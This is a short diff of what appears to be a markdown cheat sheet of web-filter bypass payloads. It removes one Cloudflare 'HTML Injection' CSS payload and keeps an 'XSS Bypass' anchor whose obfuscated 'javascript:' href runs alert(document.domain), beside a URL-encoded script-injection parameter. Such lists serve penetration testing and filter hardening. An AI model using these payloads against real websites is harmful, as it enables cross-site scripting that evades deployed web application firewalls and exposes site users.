@@ -3335,10 +3335,6 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
-- [HTML Injection](https://twitter.com/spyerror/status/1161432029319376897) by [@spyerror](https://twitter.com/spyerror)
-```
-<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
-```
 - [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
